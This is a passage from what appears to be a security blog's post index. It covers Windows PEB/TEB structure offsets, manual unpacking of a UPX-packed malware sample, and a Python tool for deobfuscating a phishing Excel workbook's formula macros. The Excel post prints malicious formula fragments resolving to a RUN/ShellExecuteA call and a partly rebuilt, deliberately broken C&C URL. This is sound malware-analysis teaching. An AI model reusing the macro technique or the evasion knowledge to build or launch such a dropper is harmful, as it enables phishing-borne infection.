_PEB_LDR_DATA* LoaderData +0C DWORD ProcessParameters +10 DWORD SubSystemData +14 DWORD ProcessHeap +18 DWORD FastPebLock +1C DWORD FastPebLockRoutine +20 DWORD FastPebUnlockRoutine +24 DWORD EnvironmentUpdateCount +28 DWORD KernelCallbackTable +2C DWORD EventLogSection +30 DWORD EventLog +34 DWORD FreeList +38 DWORD TlsExpansionCounter +3C DWORD TlsBitmap +40 DWORD TlsBitmapBits[0x2]   DWORD NumberOfHeaps +88 DWORD MaximumNumberOfHeaps +8C DWORD *ProcessHeaps +90 TEB TableThe Thread Environment Block contains information on the currently running thread ranging from the thread ID, to exceptions and error states, to referencing the PEB structure itself. Name Offset DWORD EnvironmentPointer +1C DWORD ProcessId +20 DWORD threadId +24 DWORD ActiveRpcInfo +28 DWORD ThreadLocalStoragePointer +2C PEB* Peb +30 DWORD LastErrorValue +34 DWORD CountOfOwnedCriticalSections; +38 DWORD CsrClientThread +3C DWORD Win32ThreadInfo +40 DWORD Win32ClientInfo[0x1F] +44 DWORD WOW32Reserved +48 DWORD CurrentLocale +4C DWORD FpSoftwareStatusRegister +50 DWORD SystemReserved1[0x36] +54 DWORD Spare1 +58 DWORD ExceptionCode +5C DWORD SpareBytes1[0x28] +60 DWORD SystemReserved2[0xA] +64 DWORD GdiRgn +68 DWORD GdiPen +6C DWORD GdiBrush +70 DWORD RealClientId1 +74 DWORD RealClientId2 +78 DWORD GdiCachedProcessHandle +7C DWORD GdiClientPID +80 DWORD GdiClientTID +84 DWORD GdiThreadLocaleInfo +88 DWORD UserReserved[5] +8C DWORD GlDispatchTable[0x118] +90 DWORD GlReserved1[0x1A] +94 DWORD GlReserved2 +98 DWORD GlSectionInfo +9C DWORD GlSection +A0 DWORD GlTable +A4 DWORD GlCurrentRC +A8 DWORD GlContext +AC DWORD LastStatusValue +B0 char* StaticUnicodeString +B4 char StaticUnicodeBuffer[0x105] +B8 DWORD DeallocationStack +BC DWORD TlsSlots[0x40] +C0 DWORD TlsLinks +C4 DWORD Vdm +C8 DWORD ReservedForNtRpc +CC DWORD DbgSsReserved[0x2] +D0 TIB TableThis contains similar information to TEB but was for the non-Windows NT versions (e.g. Windows 9x era and below). The TEB is the structure for Windows NT, 2000, XP, Vista, 7, 8, and 10. Name Offset _PEXCEPTION_REGISTRATION_RECORD* ExceptionList FS:[0x00] DWORD StackBase FS:[0x04] DWORD StackLimit FS:[0x08] DWORD SubSystemTib FS:[0x0C] DWORD FiberData FS:[0x10] DWORD ArbitraryUserPointer FS:[0x14] DWORD TIBOffset FS:[0x18] " }, { "title": "Manually Unpacking Malware (part 2)", "url": "/posts/Manually-unpacking-malware-part2/", "categories": "Blogging, Malware-Analysis", "tags": "malware, packers", "date": "2020-11-30 15:34:00 -0800", "snippet": "IntroThis is a follow on to the first post on this, Manually Unpacking Malware, where I talked about a way to break on the real entry point of a packed malware sample. This is a second technique called call stack backtracing wherein you find a system call to break on and then traverse backward in the chain of function calls to get to the real origin.The malware sample used in this blog post MD5 hash: 5B47FBC2DA1868022F30317EC7DDA39F VirusTotal link to sample: https://www.virustotal.com/gui/file/1bb8c898b249c47249c31d9901b12add9d307f027e5cbff97937769d7e5c732e/detectionCall stack backtracingDefinition (from Technopedia) A stack trace is a report that provides information about program subroutines. It is commonly used for certain kinds of debugging, where a stack trace can help software engineers figure out where a problem lies or how various subroutines work together during execution. A stack trace is also known as a stack traceback or a stack backtrace. [source]This can usually be graphically or textually visualized to understand how the chain of functions are calling each other. We will use Immunity Debugger to accomplish this.For our purposes, the idea here is that you need to successfully break at some point within this callstack and then walk backward to the root of the chain to find where it started.An example fragment from our sampleThe following is an example of one point in this piece of malware where it calls WinExec which in turn calls CreateProcessA which in turn calls CreateProcessInternalA.In Immunity Debugger’s stack view, we can see how this gets visualized. When a call from a function is made it pushes the memory address just after the call onto the stack. This address is seen in the image below next to the RETURN comments.Just above this is the stack memory address of which you can highlight and press enter to jump backward to the previous stackframe to see what called it. This allows us to follow it backward and traverse the call stack until we get to the starting code of the thread. Immunity Debugger will also provide some lines to help identify these stack frames.The green dots below indicate the stack addresses you can jump between to go from frame to frame.(click image for full resolution)Continuing, we jump to where the original KERNEL32.WinExec call occured.(click image for full resolution)Getting OEP in our sample via this techniqueTo gain the true OEP address of the unpacked malware in our sample we can start to look for calls to functions that are typically seen very early on in the lifecycle of a Windows application. The following set of functions are possible candidates:KERNEL32.GetStartupInfoAKERNEL32.GetCommandLineAUpon opening the malware binary in Immunity Debugger, setting a breakpoint on these two functions and hitting F9, we land in the KERNEL32 memory section at the GetStartupInfoA function. In this case, it was called at the first level in the main thread and shows a return address value of 00401730.If we follow to the return address of 00401730 we can start to scroll up through the instructions to find the beginning of the function. You will see the instruction PUSH EBP in the preamble of the functions assembly. Another indicator we are at the beginning is the RETN instruction a little higher above it.ConclusionThe backtracing technique is useful for many purposes beyond this in reverse engineering. A common use outside of finding where the unpacked code starts is when identifying the use of strings or syscalls elsewhere in the binary and further understanding how and why they are used (without having to work through the entire binary to get to the most interesting parts).A final caveat to this is when there are multiple threads running. Each will have their own stack, so you should be aware of this and set breakpoints on the creation of new threads and backtrace each one individually." }, { "title": "Manually Unpacking Malware", "url": "/posts/Manually-unpacking-malware/", "categories": "Blogging, Malware-Analysis", "tags": "malware, packers", "date": "2020-11-23 12:36:00 -0800", "snippet": "IntroThis post is intended to show one technique that can be used in an attempt to unpack a sample that is suspected to be packed by either a known packer or something unknown or even custom.There are many techniques that can be used and malware may dictate what works and what does not work. I found that this technique seems to be an easy first pass for any given packer as a first step (outside of having the packer/unpacker tool to properly unpack). The intent here is to show a way to do it when that is not feasible.The malware sample used in this blog post MD5 hash: 5B47FBC2DA1868022F30317EC7DDA39F VirusTotal link to sample: https://www.virustotal.com/gui/file/1bb8c898b249c47249c31d9901b12add9d307f027e5cbff97937769d7e5c732e/detectionIn brief: what is a packer?The term “packer” has changed over the years and can be used to mean many different things now. The three main categories of tools in this area are called packers, crypters, and protectors.For the purpose of this post I am refering to packer to be described as: A tool that compresses, encrypts, and/or modifies the bytes of a file to effectively obfuscate it and make it harder to statically analyze and reverse engineer.A few of the popular packers for malware are: UPX, ASPack, Themida, Exe Packer, MPRESS, Morphine, and others.How to know a malicious binary is packed?There are a few key indicators that you can use to make this determination pretty quickly: section names and sections being executable when they shouldn’t be, high entropy values and a mostly missing Import Table, odd entry points, to name a few.Section NamesMost packers will create their own section names within the binary. In the case of UPX (used in this sample) you will see PE section names of UPX0 and UPX1. For MPRESS you may see .MPRESS1 and .MPRESS2. For VMProtect it creates sections named .vmp0, .vmp1 and .vmp2.You can perform a quick Internet search on the section names to help identify what it may be associated to as most are well-known.Entropy ValuesThe entopy of a file is essentially an indicator of the randomness of the characters in the file. When a file has been compressed or encrypted it will have a high value of 7 or 8. Conversely, if it appears to be plaintext it will have a low entropy value.Using the Detect It Easy tool you can see the entropy of the UPX0 and UPX1 sections within the malware sample:Import TableThe Import Table of the file may look as though very few functions are being imported and used. This may simply be due to the packed file hiding most of the functions and only leaving behind what is needed during the unpacking process.Additionally, some key indicators of left over functions that are very commonly used during unpacking or resolving obfuscated functions are: VirtualProtect, GetProcAddress, and LoadLibraryA. And sure enough, when we look at the sample in the CFF Explorer tool…Tools that do it for youLastly, there are many tools that will go through and check these sorts of indicator and present you with their findings. The most popular tool is probably the PEiD tool which clearly shows our binary as UPX packed as seen below:Preparing Windows to adhere to DEP protectionBy default, Windows 10 only turns on Data Execution Prevention (DEP) for “essential Windows programs and services only”. You need to change this to be “all programs and services” so that Windows will prevent the malware from executing code in sections that are not marked Executable. In the Windows Control Panel, search for “view advanced system settings” Select the Advanced tab Click Performance-&amp;gt;Settings Select the Data Execution Prevention tab Select the radial option to enable DEP for all applications Reboot your VM for the setting to take affectManual Unpacking StepsOpening malware sample in Immunity Debugger Open Immunity Debugger and hit F3 to open a dialog to select the malware file to open The file will load and break at what it believes to be the Module Entry Point (this is the beginning of the unpacker code in this case)Observe the UPX sections Press ALT+M to identify the UPX0 and UPX1 sections. Note that both of these sections have access level RWE (Read/Write/Execute) If you double-click on the UPX0 section a dump window will show that the section is simply a placeholder for the decoded bytes If you double-click the UPX1 section you will see the UPX unpacking routine that will write the decoded bytes into the UPX0 sectionRemove Execute permission from the UPX0 sectionBefore we attempt to let the malware unpack itself we need to setup a way for it to stop execution upon finishing its unpacking routine. To do this we will set the UPX0 section that it is writing bytes to, to RW as opposed to RWE. This should cause an Access Violation once it attempts to pass control to the newly unpacked code. Change the UPX0 section to RWThe updated permissions should look like the following now:Catching VirtualProtect callsMalware will also attempt to update the permissions on its own so we need to setup breakpoints for that scenario as well. If we do not catch this, the malware may update the section back to RWE and continue running. Press CTRL+G to enter an expression and type in VirtualProtect and set a breakpoint here via F2Execute malware until access violation To continue running the malware in the debugger press F9In this case we’ll see VirtualProtect being hit and specifically for the address 00400000 which is the “PE header” section that it is changing from R to RW (and a second call later to revert it back to R)The third time we hit F9 we will get an Access Violation as it attempts to pass control to the UPX0 section and begin executing code (the landing point address should be our true OEP). The violation occurred since we manually set the section to not be able to execute and this is being enforced by DEP.Dumping memory to file via OllyDumpEx pluginNOTE: If you don’t have the plugin you can download it from OllyDumpEx.At this point, the UPX decoding is complete and we can dump memory to disk. Upon dumping memory to disk the Import Table will still be broken and we’ll need to fix this via an import table recovery tool. Use Plugins-&amp;gt;OllyDumpEx-&amp;gt;Dump process to save memory to disk Click “Get EIP as OEP” and then click “Dump” to save to a fileNOTE: Do not close Immunity Debugger! Leave it running as it is still needed by the ImportRec tool to patch the file in the next stepFix Import Table via ImportRecImport REConstructor is a tool that can scan the running binary in your debugger for all calls to system functions and reconstruct the import table as a patch to the dumped file. In this process it will also create a new section in the file called .mackt Open Import REConstructor and attach to the active malware binary process that is still running in Immunity Debugger and then click “Get Imports” Finally, click “Fix Dump” and select the dumped file on disk as a result of using the OllyDumpEx plugin. At this point, the Import Table should be patched and ready for additional analysis.Functions back in the import tableWhen the resulting binary is now pulled into IDA you’ll see quite a few more system functions show up from the newly patched Import Table.Additional notesYou will find a new section created called .mackt. This is created by the Import REconstructor tool as part of the patching of the Import Table. This section needs to stay here as if you try to delete it, the Import Table will also disappear along with it.As for the UPX1 section where the original packed code is, that can be deleted completly from CFF Explorer -&amp;gt; Delete Section (Header and Data) without impact. This may not be the case for every sample though.While you get recovery of all the code needed to continue analysis, you will not get full recovery of the names of the original sections (.text, .rdata, .data, .rsrc) as you would with the original packer tool performing the reversal. However, this does not stop further analysis in any way.ConclusionThis is one of several methods to unpack a packed binary to continue analysis. This method should work for many pieces of malware but as they get more complicated this would be one step of many (multiple encodings, further encryption, other anti-analysis and debugging tricks that need to be addressed along the way and more).Continue reading with Manually Unpacking Malware (part 2)" }, { "title": "Digging into obfuscated excel formula code", "url": "/posts/Digging-into-obfuscated-excel-formula-code/", "categories": "Blogging, Malware-Analysis", "tags": "malware, excel, scripts, macros, phishing", "date": "2020-10-02 21:33:00 -0700", "snippet": "IntroA large amount of malware that targets businesses is through phishing attacks, and that is no different where I work. We have been getting an influx of excel attachments in phishing documents and instead of having easy to extract VB macro code it is instead large amounts of obfuscated formula code.This post is specifically to talk about some static analysis performed at that stage of the analysis and the custom python I wrote in an attempt to get some insight into what it may be doing.The sample and supporting codeI have uploaded the sample to VirusTotal and have created a GitHub repository with the python code discussed here and example output.VirusTotal:https://www.virustotal.com/gui/file/0aae8be1164f7c19c2c7215030b907d1ddefb186b7da77687ddccc4731267474/detectionGitHub:https://github.com/tdmathison/ExcelFormulaExtractorPassword protected excel workbookBefore looking at the code there are two things that may be pitfalls. First is that in this case the excel sheet is password protected (but we have the password as it was given in the phishing email it came from), secondly, when you export excel tabs to CSV files you may “lose data” if not careful.Removing password protection from excel documentTo remove password protection on the excel document you can utilize the msoffcrypto-crack.py script. This is installed and ready for use within the FireEye FlareVM.pass.txt contains:F0409!Command:PS C:\\Users\\flarevm\\Desktop\\6050874161397760&amp;gt; &amp;amp; &#39;C:\\Python27\\python.exe&#39; C:\\Tools\\msoffcrypto-crack\\msoffcrypto-crack.py -p .\\pass.txt -o decrypted.xls .\\sample.xlsPassword found: F0409!This will create a new file called decrypted.xls that will no longer prompt for a password.Exporting excel workbook tabs as CSV filesTo export tabs to CSV files you simply need to: Select the tab you want to export Select File-&amp;gt;Export-&amp;gt;Change File Type and select “CSV (Comma delimited)(*.csv)The catch: In the case of formulas that reference specific columns and rows we need to preserve this in the exported data. When you export you may LOSE this data by excel eliminating many columns or rows that did not contain data. Formulas in malware often embed themselves dozens or hundreds of columns deep.The solution:All you need to do is enter a single value into the A1 cell. Just enter the number “1” before performing the export to CSV and it will capture the complete document and preserve the columns and rows needed for analysis.Observing the malwares formula codeWhen observing the Name Manager in the excel book I saw an Auto_Open value that refered to =I!$CS$25895 and this is where I saw the initial formula code which I quickly realized was obfuscated to make it difficult to make sense of.Following the formula code jumping around shows how painful this would be to manually attempt to follow.The programatic solutionIn an attempt to solve this problem I had two specific requirements:1) Since specific cells were referenced by name such as $AB$50741 I needed to make sure I built a table were they could be referenced2) I needed a way to start with a value in a given cell and then merge the content into the string by replacing the cell location textAll that would be left is applying step 2 over and over until there are no more cell location strings to replace.Dumping content into hashmapThe first part is achieved by creating a hashmap and reading through all delimited data and adding it to the hashmap with the key being the formatted location of the cell that would be referenced in the formula code.excel_data = {}# Locates all excel sheet cells with data and saves the cell location as a key and the content as the valuedef dump_excel_sheet_values(filepath): with open(filepath) as file: lines = file.readlines() for row, row_values in enumerate(lines): values = row_values.split(&#39;,&#39;) for col, col_value in enumerate(values): value_to_save = col_value.strip().replace(&#39;\\n&#39;, &#39;\\\\n&#39;) if value_to_save: excel_data[str.format(&quot;${}${}&quot;, get_col_name(col + 1), row + 1)] = value_to_savedump_excel_sheet_values(sys.argv[1])With this we can dump out the content and display the proper cell location as shown in the partial snippet below:$A$1: 1$BM$65: 19053$BM$66: 40$HC$292: i$AH$462: a$HE$736: w$AR$982: J$AC$1180: h$DP$1387: d$DV$1540: Y$FS$1919: P$IM$2401: Y$DS$2454: e$FO$2480: N$DX$2684: EsNDtISBBnaCXk=$HF$26301&amp;amp;$EB$37517&amp;amp;$Y$59856&amp;amp;$H$23233&amp;amp;$FR$26455&amp;amp;$BK$49458&amp;amp;$P$23617&amp;amp;$FU$38413&amp;amp;$G$15199&amp;amp;$DF$13040$DX$2685: ygxjnNCysLIfB=$GC$31380$DX$2686: =$ER$4739()$DX$2687: =RUN($AX$7390)Reconstructing the formula strings into something usefulThe final step is to take all of these obfuscated strings and merge in the content of all the cell location references. I made a simple function that will do this for the first cell location is find (via regex search). In the end, this function just gets applied to the string over and over until it can no longer find any more references to other cells.# Checks if the string concatenates other cell data and merges the first occurrence indef reconstruct(data): result = re.search(regexp_cell_pos, data) if result: data_modified = data[0: result.start()] if data[result.start(): result.end()] in excel_data.keys(): # merge in the content from the referenced cell data_modified += excel_data[data[result.start(): result.end()]] else: # blank cell that is used to store values at runtime data_modified += &#39;(var-cell)&#39; data_modified += data[result.end() + 1:] return repair(data_modified) return NoneFinally, we loop through every key we populated and see how much it can merge together. Some cells are just single characters that are used to concatenate text together and some cells make 10+ cell references.# Run through each key and attempt to reconstructfor key in excel_data: print(&quot;Initial: {}&quot;.format(excel_data[key])) new_val = reconstruct(excel_data[key]) new_string = new_val while new_val: print(new_val) new_string = new_val new_val = reconstruct(new_string) if (new_string is not None) and (new_string != &#39;(var-cell)&#39;): final_strings.append(new_string) print(&quot;Final: {}&quot;.format(new_string)) print(&quot;********************************************************&quot;)ResultsThe resulting output is very large so an couple examples of where the value came out of this are:Showing it resolve a Win32 functionInitial: =RUN($II$26959)=RUN(EsNDtISBBnaCXk=$EI$48049&amp;amp;$U$22638&amp;amp;$EO$25738&amp;amp;$FR$34525&amp;amp;$AP$37942&amp;amp;$B$6338&amp;amp;$CQ$36635&amp;amp;$DS$2454&amp;amp;$AW$53450&amp;amp;$DA$9220&amp;amp;$FX$55530&amp;amp;$DO$26222&amp;amp;$CV$8941=RUN(EsNDtISBBnaCXk=S$U$22638&amp;amp;$EO$25738&amp;amp;$FR$34525&amp;amp;$AP$37942&amp;amp;$B$6338&amp;amp;$CQ$36635&amp;amp;$DS$2454&amp;amp;$AW$53450&amp;amp;$DA$9220&amp;amp;$FX$55530&amp;amp;$DO$26222&amp;amp;$CV$8941=RUN(EsNDtISBBnaCXk=Sh$EO$25738&amp;amp;$FR$34525&amp;amp;$AP$37942&amp;amp;$B$6338&amp;amp;$CQ$36635&amp;amp;$DS$2454&amp;amp;$AW$53450&amp;amp;$DA$9220&amp;amp;$FX$55530&amp;amp;$DO$26222&amp;amp;$CV$8941=RUN(EsNDtISBBnaCXk=She$FR$34525&amp;amp;$AP$37942&amp;amp;$B$6338&amp;amp;$CQ$36635&amp;amp;$DS$2454&amp;amp;$AW$53450&amp;amp;$DA$9220&amp;amp;$FX$55530&amp;amp;$DO$26222&amp;amp;$CV$8941=RUN(EsNDtISBBnaCXk=Shel$AP$37942&amp;amp;$B$6338&amp;amp;$CQ$36635&amp;amp;$DS$2454&amp;amp;$AW$53450&amp;amp;$DA$9220&amp;amp;$FX$55530&amp;amp;$DO$26222&amp;amp;$CV$8941=RUN(EsNDtISBBnaCXk=Shell$B$6338&amp;amp;$CQ$36635&amp;amp;$DS$2454&amp;amp;$AW$53450&amp;amp;$DA$9220&amp;amp;$FX$55530&amp;amp;$DO$26222&amp;amp;$CV$8941=RUN(EsNDtISBBnaCXk=ShellE$CQ$36635&amp;amp;$DS$2454&amp;amp;$AW$53450&amp;amp;$DA$9220&amp;amp;$FX$55530&amp;amp;$DO$26222&amp;amp;$CV$8941=RUN(EsNDtISBBnaCXk=ShellEx$DS$2454&amp;amp;$AW$53450&amp;amp;$DA$9220&amp;amp;$FX$55530&amp;amp;$DO$26222&amp;amp;$CV$8941=RUN(EsNDtISBBnaCXk=ShellExe$AW$53450&amp;amp;$DA$9220&amp;amp;$FX$55530&amp;amp;$DO$26222&amp;amp;$CV$8941=RUN(EsNDtISBBnaCXk=ShellExec$DA$9220&amp;amp;$FX$55530&amp;amp;$DO$26222&amp;amp;$CV$8941=RUN(EsNDtISBBnaCXk=ShellExecu$FX$55530&amp;amp;$DO$26222&amp;amp;$CV$8941=RUN(EsNDtISBBnaCXk=ShellExecut$DO$26222&amp;amp;$CV$8941=RUN(EsNDtISBBnaCXk=ShellExecute$CV$8941=RUN(EsNDtISBBnaCXk=ShellExecuteAFinal: =RUN(EsNDtISBBnaCXk=ShellExecuteAShowing it resolve the C&amp;amp;C URLNOTE: I have intentionally broken the link text formulated below.Initial: EsNDtISBBnaCXk=$W$27806&amp;amp;$DB$48425&amp;amp;$CG$29888&amp;amp;$GH$57090&amp;amp;$EK$3388&amp;amp;$BT$55498&amp;amp;$IL$29507&amp;amp;$CR$10941&amp;amp;$U$21547&amp;amp;$GY$4902&amp;amp;$AE$53306&amp;amp;$BX$30413&amp;amp;$FG$27124&amp;amp;$BV$30953&amp;amp;$IM$56694&amp;amp;$EV$38328&amp;amp;$CF$15512&amp;amp;$EG$30041&amp;amp;$DZ$15836&amp;amp;$ET$32765&amp;amp;$CQ$47333&amp;amp;$HE$736&amp;amp;$V$24861&amp;amp;$DP$11026&amp;amp;$FA$21247&amp;amp;$CD$7333&amp;amp;$AK$10221&amp;amp;$HH$23769&amp;amp;$DK$39723&amp;amp;$BH$15533&amp;amp;$AC$35202&amp;amp;$CT$11282&amp;amp;$EY$36257EsNDtISBBnaCXk=h$DB$48425&amp;amp;$CG$29888&amp;amp;$GH$57090&amp;amp;$EK$3388&amp;amp;$BT$55498&amp;amp;$IL$29507&amp;amp;$CR$10941&amp;amp;$U$21547&amp;amp;$GY$4902&amp;amp;$AE$53306&amp;amp;$BX$30413&amp;amp;$FG$27124&amp;amp;$BV$30953&amp;amp;$IM$56694&amp;amp;$EV$38328&amp;amp;$CF$15512&amp;amp;$EG$30041&amp;amp;$DZ$15836&amp;amp;$ET$32765&amp;amp;$CQ$47333&amp;amp;$HE$736&amp;amp;$V$24861&amp;amp;$DP$11026&amp;amp;$FA$21247&amp;amp;$CD$7333&amp;amp;$AK$10221&amp;amp;$HH$23769&amp;amp;$DK$39723&amp;amp;$BH$15533&amp;amp;$AC$35202&amp;amp;$CT$11282&amp;amp;$EY$36257EsNDtISBBnaCXk=ht$CG$29888&amp;amp;$GH$57090&amp;amp;$EK$3388&amp;amp;$BT$55498&amp;amp;$IL$29507&amp;amp;$CR$10941&amp;amp;$U$21547&amp;amp;$GY$4902&amp;amp;$AE$53306&amp;amp;$BX$30413&amp;amp;$FG$27124&amp;amp;$BV$30953&amp;amp;$IM$56694&amp;amp;$EV$38328&amp;amp;$CF$15512&amp;amp;$EG$30041&amp;amp;$DZ$15836&amp;amp;$ET$32765&amp;amp;$CQ$47333&amp;amp;$HE$736&amp;amp;$V$24861&amp;amp;$DP$11026&amp;amp;$FA$21247&amp;amp;$CD$7333&amp;amp;$AK$10221&amp;amp;$HH$23769&amp;amp;$DK$39723&amp;amp;$BH$15533&amp;amp;$AC$35202&amp;amp;$CT$11282&amp;amp;$EY$36257EsNDtISBBnaCXk=htt$GH$57090&amp;amp;$EK$3388&amp;amp;$BT$55498&amp;amp;$IL$29507&amp;amp;$CR$10941&amp;amp;$U$21547&amp;amp;$GY$4902&amp;amp;$AE$53306&amp;amp;$BX$30413&amp;amp;$FG$27124&amp;amp;$BV$30953&amp;amp;$IM$56694&amp;amp;$EV$38328&amp;amp;$CF$15512&amp;amp;$EG$30041&amp;amp;$DZ$15836&amp;amp;$ET$32765&amp;amp;$CQ$47333&amp;amp;$HE$736&amp;amp;$V$24861&amp;amp;$DP$11026&amp;amp;$FA$21247&amp;amp;$CD$7333&amp;amp;$AK$10221&amp;amp;$HH$23769&amp;amp;$DK$39723&amp;amp;$BH$15533&amp;amp;$AC$35202&amp;amp;$CT$11282&amp;amp;$EY$36257EsNDtISBBnaCXk=http$EK$3388&amp;amp;$BT$55498&amp;amp;$IL$29507&amp;amp;$CR$10941&amp;amp;$U$21547&amp;amp;$GY$4902&amp;amp;$AE$53306&amp;amp;$BX$30413&amp;amp;$FG$27124&amp;amp;$BV$30953&amp;amp;$IM$56694&amp;amp;$EV$38328&amp;amp;$CF$15512&amp;amp;$EG$30041&amp;amp;$DZ$15836&amp;amp;$ET$32765&amp;amp;$CQ$47333&amp;amp;$HE$736&amp;amp;$V$24861&amp;amp;$DP$11026&amp;amp;$FA$21247&amp;amp;$CD$7333&amp;amp;$AK$10221&amp;amp;$HH$23769&amp;amp;$DK$39723&amp;amp;$BH$15533&amp;amp;$AC$35202&amp;amp;$CT$11282&amp;amp;$EY$36257EsNDtISBBnaCXk=https$BT$55498&amp;amp;$IL$29507&amp;amp;$CR$10941&amp;amp;$U$21547&amp;amp;$GY$4902&amp;amp;$AE$53306&amp;amp;$BX$30413&amp;amp;$FG$27124&amp;amp;$BV$30953&amp;amp;$IM$56694&amp;amp;$EV$38328&amp;amp;$CF$15512&amp;amp;$EG$30041&amp;amp;$DZ$15836&amp;amp;$ET$32765&amp;amp;$CQ$47333&amp;amp;$HE$736&amp;amp;$V$24861&amp;amp;$DP$11026&amp;amp;$FA$21247&amp;amp;$CD$7333&amp;amp;$AK$10221&amp;amp;$HH$23769&amp;amp;$DK$39723&amp;amp;$BH$15533&amp;amp;$AC$35202&amp;amp;$CT$11282&amp;amp;$EY$36257EsNDtISBBnaCXk=https:$IL$29507&amp;amp;$CR$10941&amp;amp;$U$21547&amp;amp;$GY$4902&amp;amp;$AE$53306&amp;amp;$BX$30413&amp;amp;$FG$27124&amp;amp;$BV$30953&amp;amp;$IM$56694&amp;amp;$EV$38328&amp;amp;$CF$15512&amp;amp;$EG$30041&amp;amp;$DZ$15836&amp;amp;$ET$32765&amp;amp;$CQ$47333&amp;amp;$HE$736&amp;amp;$V$24861&amp;amp;$DP$11026&amp;amp;$FA$21247&amp;amp;$CD$7333&amp;amp;$AK$10221&amp;amp;$HH$23769&amp;amp;$DK$39723&amp;amp;$BH$15533&amp;amp;$AC$35202&amp;amp;$CT$11282&amp;amp;$EY$36257EsNDtISBBnaCXk=https:/$CR$10941&amp;amp;$U$21547&amp;amp;$GY$4902&amp;amp;$AE$53306&amp;amp;$BX$30413&amp;amp;$FG$27124&amp;amp;$BV$30953&amp;amp;$IM$56694&amp;amp;$EV$38328&amp;amp;$CF$15512&amp;amp;$EG$30041&amp;amp;$DZ$15836&amp;amp;$ET$32765&amp;amp;$CQ$47333&amp;amp;$HE$736&amp;amp;$V$24861&amp;amp;$DP$11026&amp;amp;$FA$21247&amp;amp;$CD$7333&amp;amp;$AK$10221&amp;amp;$HH$23769&amp;amp;$DK$39723&amp;amp;$BH$15533&amp;amp;$AC$35202&amp;amp;$CT$11282&amp;amp;$EY$36257EsNDtISBBnaCXk=https ://$U$21547&amp;amp;$GY$4902&amp;amp;$AE$53306&amp;amp;$BX$30413&amp;amp;$FG$27124&amp;amp;$BV$30953&amp;amp;$IM$56694&amp;amp;$EV$38328&amp;amp;$CF$15512&amp;amp;$EG$30041&amp;amp;$DZ$15836&amp;amp;$ET$32765&amp;amp;$CQ$47333&amp;amp;$HE$736&amp;amp;$V$24861&amp;amp;$DP$11026&amp;amp;$FA$21247&amp;amp;$CD$7333&amp;amp;$AK$10221&amp;amp;$HH$23769&amp;amp;$DK$39723&amp;amp;$BH$15533&amp;amp;$AC$35202&amp;amp;$CT$11282&amp;amp;$EY$36257EsNDtISBBnaCXk=https ://c$GY$4902&amp;amp;$AE$53306&amp;amp;$BX$30413&amp;amp;$FG$27124&amp;amp;$BV$30953&amp;amp;$IM$56694&amp;amp;$EV$38328&amp;amp;$CF$15512&amp;amp;$EG$30041&amp;amp;$DZ$15836&amp;amp;$ET$32765&amp;amp;$CQ$47333&amp;amp;$HE$736&amp;amp;$V$24861&amp;amp;$DP$11026&amp;amp;$FA$21247&amp;amp;$CD$7333&amp;amp;$AK$10221&amp;amp;$HH$23769&amp;amp;$DK$39723&amp;amp;$BH$15533&amp;amp;$AC$35202&amp;amp;$CT$11282&amp;amp;$EY$36257EsNDtISBBnaCXk=https ://co$AE$53306&amp;amp;$BX$30413&amp;amp;$FG$27124&amp;amp;$BV$30953&amp;amp;$IM$56694&amp;amp;$EV$38328&amp;amp;$CF$15512&amp;amp;$EG$30041&amp;amp;$DZ$15836&amp;amp;$ET$32765&amp;amp;$CQ$47333&amp;amp;$HE$736&amp;amp;$V$24861&amp;amp;$DP$11026&amp;amp;$FA$21247&amp;amp;$CD$7333&amp;amp;$AK$10221&amp;amp;$HH$23769&amp;amp;$DK$39723&amp;amp;$BH$15533&amp;amp;$AC$35202&amp;amp;$CT$11282&amp;amp;$EY$36257EsNDtISBBnaCXk=https ://com$BX$30413&amp;amp;$FG$27124&amp;amp;$BV$30953&amp;amp;$IM$56694&amp;amp;$EV$38328&amp;amp;$CF$15512&amp;amp;$EG$30041&amp;amp;$DZ$15836&amp;amp;$ET$32765&amp;amp;$CQ$47333&amp;amp;$HE$736&amp;amp;$V$24861&amp;amp;$DP$11026&amp;amp;$FA$21247&amp;amp;$CD$7333&amp;amp;$AK$10221&amp;amp;$HH$23769&amp;amp;$DK$39723&amp;amp;$BH$15533&amp;amp;$AC$35202&amp;amp;$CT$11282&amp;amp;$EY$36257EsNDtISBBnaCXk=https ://comp$FG$27124&amp;amp;$BV$30953&amp;amp;$IM$56694&amp;amp;$EV$38328&amp;amp;$CF$15512&amp;amp;$EG$30041&amp;amp;$DZ$15836&amp;amp;$ET$32765&amp;amp;$CQ$47333&amp;amp;$HE$736&amp;amp;$V$24861&amp;amp;$DP$11026&amp;amp;$FA$21247&amp;amp;$CD$7333&amp;amp;$AK$10221&amp;amp;$HH$23769&amp;amp;$DK$39723&amp;amp;$BH$15533&amp;amp;$AC$35202&amp;amp;$CT$11282&amp;amp;$EY$36257EsNDtISBBnaCXk=https ://compo$BV$30953&amp;amp;$IM$56694&amp;amp;$EV$38328&amp;amp;$CF$15512&amp;amp;$EG$30041&amp;amp;$DZ$15836&amp;amp;$ET$32765&amp;amp;$CQ$47333&amp;amp;$HE$736&amp;amp;$V$24861&amp;amp;$DP$11026&amp;amp;$FA$21247&amp;amp;$CD$7333&amp;amp;$AK$10221&amp;amp;$HH$23769&amp;amp;$DK$39723&amp;amp;$BH$15533&amp;amp;$AC$35202&amp;amp;$CT$11282&amp;amp;$EY$36257EsNDtISBBnaCXk=https ://compon$IM$56694&amp;amp;$EV$38328&amp;amp;$CF$15512&amp;amp;$EG$30041&amp;amp;$DZ$15836&amp;amp;$ET$32765&amp;amp;$CQ$47333&amp;amp;$HE$736&amp;amp;$V$24861&amp;amp;$DP$11026&amp;amp;$FA$21247&amp;amp;$CD$7333&amp;amp;$AK$10221&amp;amp;$HH$23769&amp;amp;$DK$39723&amp;amp;$BH$15533&amp;amp;$AC$35202&amp;amp;$CT$11282&amp;amp;$EY$36257EsNDtISBBnaCXk=https ://compone$EV$38328&amp;amp;$CF$15512&amp;amp;$EG$30041&amp;amp;$DZ$15836&amp;amp;$ET$32765&amp;amp;$CQ$47333&amp;amp;$HE$736&amp;amp;$V$24861&amp;amp;$DP$11026&amp;amp;$FA$21247&amp;amp;$CD$7333&amp;amp;$AK$10221&amp;amp;$HH$23769&amp;amp;$DK$39723&amp;amp;$BH$15533&amp;amp;$AC$35202&amp;amp;$CT$11282&amp;amp;$EY$36257EsNDtISBBnaCXk=https 